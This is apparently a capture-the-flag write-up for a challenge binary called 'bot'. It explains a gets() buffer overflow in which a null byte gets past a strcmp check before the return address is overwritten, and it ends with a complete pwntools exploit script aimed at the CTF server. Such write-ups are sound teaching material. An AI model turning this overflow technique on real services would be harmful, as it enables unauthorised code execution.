We have the following C file

![image](https://user-images.githubusercontent.com/96965806/218291958-facba6aa-396c-429d-9c88-bed271a42c02.png)

The executable contains the vulnerable `gets` function, which means that there is a buffer overflow vulnerability that we can exploit.
We can overwrite the return address of `main` to jump to any point in the program that is interesting to us.

In particular we want to jump inside the following if statement
![image](https://user-images.githubusercontent.com/96965806/218292038-e788533a-57eb-4533-95a0-d2ced155ce6b.png)

However, if we don't satisfy the first if statement, the programs calls `exit(1)`, which means that we will never reach the `ret` statement in the binary.
Thankfully, the `strcmp` function only reads until it finds a null character `\x00` . This means that we can structure a payload that looks like this:
```
gimme = b'give me the flag\x00'
payload = gimme + <rest of the payload>
```

This would satisfy the if statement while allowing us to take advantage of the buffer overflow vulnerability.
Using ghidra we can find the offset between the input and the return address
![image](https://user-images.githubusercontent.com/96965806/218292182-0c670421-af12-4bc2-abc0-1c54c7a66711.png)

Then we can look at the assembly to determine where exactly we want to jump to
![image](https://user-images.githubusercontent.com/96965806/218292267-03ad2c76-105d-4c93-8375-cb356be2cfae.png)

We want to jump right after the if statement, so the best address is `0x000000000040128e`

This is what the final exploit looks like

```
from pwn import *

elf = context.binary = ELF('./bot')

#io = process('./bot')
#io = gdb.debug('./bot','continue')
io = remote('lac.tf', '31180')

gimme = b"give me the flag\x00"
payload = gimme + ((0x48 - len(gimme))* b'A') + p64(0x000000000040128e)

io.sendlineafter(b'help?', payload)
io.interactive()
```
